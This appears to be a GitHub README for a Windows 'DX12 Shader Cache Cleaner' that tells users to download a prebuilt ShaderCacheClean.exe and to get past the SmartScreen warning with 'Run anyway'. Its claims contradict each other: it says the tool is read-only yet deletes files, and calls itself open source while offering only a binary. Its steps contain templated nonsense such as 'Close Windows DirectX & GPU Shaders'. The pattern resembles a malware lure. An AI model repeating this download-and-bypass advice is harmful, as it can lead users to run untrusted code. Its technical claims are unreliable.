<p align="center">
  <img src="https://i.postimg.cc/qMcS6Rwk/banner.png" alt="DX12 Shader Cache Cleaner — Clear NVIDIA, AMD & Windows DirectX Shader Caches Safely" width="100%">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Platform-Windows%2010%2F11%20x64-0078D6?style=flat-square&logo=windows" alt="Platform: Windows 10/11 x64">
  <img src="https://img.shields.io/badge/Mode-GPU%20Cache%20Cleaner-2EA44F?style=flat-square" alt="Mode">
  <img src="https://img.shields.io/badge/Release-shader--cleaner--26.11a-5391FE?style=flat-square" alt="Release Tag">
  <img src="https://img.shields.io/badge/License-MIT-8B5CF6?style=flat-square" alt="License: MIT">
</p>

# DX12 Shader Cache Cleaner — Clear NVIDIA, AMD & Windows DirectX Shader Caches Safely

**Games stuttering after a GPU driver update? Unreal Engine 5 titles freezing on shader compilation or eating 10+ GB on drive C:? Safely inspect and clear NVIDIA, AMD, and Windows DirectX shader caches without touching your game saves.**

DX12 Shader Cache Cleaner focuses on a common Windows PC bottleneck: **compiled GPU pipeline caches accumulate across `%LOCALAPPDATA%\NVIDIA`, `%LOCALAPPDATA%\AMD`, and `%LOCALAPPDATA%\D3DSCache`**, consuming gigabytes on drive `C:` and causing micro-stutter or `DXGI_ERROR` crashes when stale entries persist after driver updates.

This project is aimed at **Windows 10/11 PC gamers with NVIDIA, AMD, or Intel Arc GPUs**. It safely inspects and purges temporary shader cache directories while leaving game saves, configs, and drivers completely untouched.

## Quick Symptom & Cause Reference

| Symptom / Error | Likely Cause | Recommended Check |
| --- | --- | --- |
| Severe stutter after updating NVIDIA or AMD drivers | Old DX12/Vulkan shader entries conflicting with new driver compiler | Clear `DXCache` / `DxCache` and let games rebuild clean pipelines |
| Drive `C:` losing 8 GB–15 GB of free space | Accumulated shader caches from dozens of uninstalled or patched games | Inspect exact folder sizes across NVIDIA, AMD, and `D3DSCache` |
| UE5 game crashes on shader warm-up screen | Corrupted `.bin` / `.toc` shader cache file after an abrupt crash | Purge corrupted cache files and restart the game to recompile |
| Windows Disk Cleanup skips locked GPU caches | Active background browser or launcher holding handles on cache files | Close browsers/launchers before running a clean shader cache reset |

## Download for Windows

[**Download ShaderCacheClean.zip — Latest GitHub Release (Windows x64)**](../../releases/latest/download/ShaderCacheClean.zip)  
[View All Releases & Changelog](../../releases) · [Report an Issue](../../issues)

### Why run `ShaderCacheClean.exe`? (Automatic checks in ~2 seconds)

- Scans NVIDIA (`DXCache`, `GLCache`), AMD (`DxCache`, `VkCache`), Intel, and Windows `D3DSCache` folders.
- Calculates exact disk space used on drive `C:` before deleting a single file.
- Safely skips files currently locked by active system processes without throwing errors.
- Never touches game `Saved`, `AppData` profiles, or graphics configuration files.

### Sample Diagnostic Output

```text
[ShaderCacheClean] Scanning GPU & DirectX shader cache directories on C:...
[INFO] NVIDIA DXCache   : 4.82 GB (318 files)
[INFO] NVIDIA GLCache   : 642.0 MB (44 files)
[INFO] Windows D3DSCache: 1.15 GB (89 files)
[INFO] AMD DxCache      : Not present
[OK]   Total Reclaimable: 6.61 GB across 451 shader cache files
```

The release ZIP is named `ShaderCacheClean.zip`; the Windows executable inside is named `ShaderCacheClean.exe`.

1. Close Windows DirectX & GPU Shaders before moving or checking files.
2. Click **Download ShaderCacheClean.zip** above.
3. Right-click the downloaded archive and choose **Extract All**.
4. Open the extracted folder and run `ShaderCacheClean.exe`.
5. Review the reported locations and status checks before making any changes to your files.
6. Restart Windows DirectX & GPU Shaders and verify behavior after applying any recommended fixes.

**Requirements:** Windows 10 or 11 (64-bit) with NVIDIA, AMD, or Intel graphics drivers installed.

### Verification & Windows SmartScreen Note

- **Read-only & standard user permissions:** `ShaderCacheClean.exe` runs without administrator rights and does not modify game binaries, system registry keys, or Windows Defender settings.
- **Windows SmartScreen:** Because this is an independent open-source utility without a commercial EV code-signing certificate, Windows SmartScreen may show *"Windows protected your PC"* on first launch. Click **More info → Run anyway** after verifying the release checksum on the [Releases](../../releases) page.

## Problems this project focuses on

### Stale shader pipelines after GPU driver updates or game patches

When games update rendering shaders without invalidating old driver cache hashes, DirectX 12 titles suffer severe traversal hitching.

### System drive `C:` filling up silently

Even when games live on `D:` or `E:`, Windows and GPU drivers store all compiled shaders in `%LOCALAPPDATA%` on `C:`.

### Manual deletion blocked by locked files in Explorer

Deleting `%LOCALAPPDATA%\NVIDIA\DXCache` manually in File Explorer often fails midway due to background desktop processes holding handles.

### Knowing where each GPU vendor hides shader caches

NVIDIA, AMD, Intel, and Windows each use separate cache paths across `Local` and `LocalLow`.

## Where Windows DirectX & GPU Shaders files normally belong

Windows and GPU drivers store compiled shaders across these `%LOCALAPPDATA%` paths:

```text
%LOCALAPPDATA%\NVIDIA\DXCache\
```

Inside that structure, key files and subdirectories typically look like this:

```text
%LOCALAPPDATA%\
├── NVIDIA\
│   ├── DXCache\
│   └── GLCache\
├── AMD\
│   ├── DxCache\
│   └── VkCache\
└── D3DSCache\
```

After clearing shader caches, expect brief shader compilation during the first few minutes of gameplay as fresh pipelines are generated.

## A practical troubleshooting checklist

If your issue still persists, work through these checks in order:

1. **Close all running games, Steam/Epic overlays, and browsers.** Frees file locks so maximum stale cache files can be cleaned.
2. **Inspect current shader cache sizes on `C:`.** Review how much space NVIDIA, AMD, and `D3DSCache` are occupying.
3. **Run the shader cache cleanup.** Remove stale `.bin` and `.toc` shader cache entries safely.
4. **Verify Shader Cache Size in NVIDIA Control Panel / AMD Adrenalin.** Set NVIDIA Shader Cache Size to `10 GB` or `Unlimited` for modern UE5 games.
5. **Launch your game and allow initial shader warm-up to finish.** Let the main-menu shader compilation bar complete uninterrupted.

### Before moving any files

No game saves or settings are touched by shader cache cleanup, as all target folders are automatically regenerated by your GPU driver.

## What an effective diagnostic report should tell you

A clear cache report displays **exact folder paths, file counts, and MB/GB sizes** for NVIDIA, AMD, Intel, and Windows DirectX shader caches.

## FAQ

**Is it safe to delete NVIDIA DXCache and AMD DxCache?**

Yes. Both folders contain temporary compiled shaders that your GPU driver automatically rebuilds when you launch a game.

**Will clearing shader caches delete my game saves or settings?**

No. Game saves and configuration files are stored in completely separate directories.

**Why does a game stutter briefly right after clearing the shader cache?**

Because the GPU is compiling fresh shaders for the first time; once compiled, frame pacing stabilizes.

**Does this work with NVIDIA, AMD, and Intel GPUs?**

Yes—it automatically detects whichever vendor cache folders exist on your PC.

## Useful reading

- [NVIDIA Support — Driver & Shader Cache Info](https://www.nvidia.com/en-us/support/)
- [AMD Support — Radeon Software & Shader Cache](https://www.amd.com/en/support)

## More Windows Game Diagnostic Tools

- [Stalker2-ShaderCacheGuard](../Stalker2-ShaderCacheGuard) — S.T.A.L.K.E.R. 2 UE5 shader compilation & `C:` space check
- [CrimsonDesert-ShaderFrameDoctor](../CrimsonDesert-ShaderFrameDoctor) — Crimson Desert DX12 shader cache & save diagnostics
- [MHWilds-ShaderFrameDoctor](../MHWilds-ShaderFrameDoctor) — Monster Hunter Wilds `shader.cache2` & VRAM check
- [Win11-GamingDebloatGuard](../Win11-GamingDebloatGuard) — Windows 11 gaming optimizer & background process cleaner

*Independent open-source Windows utility. Not affiliated with NVIDIA, AMD, Intel, or Microsoft.*
 
 
 
 
 
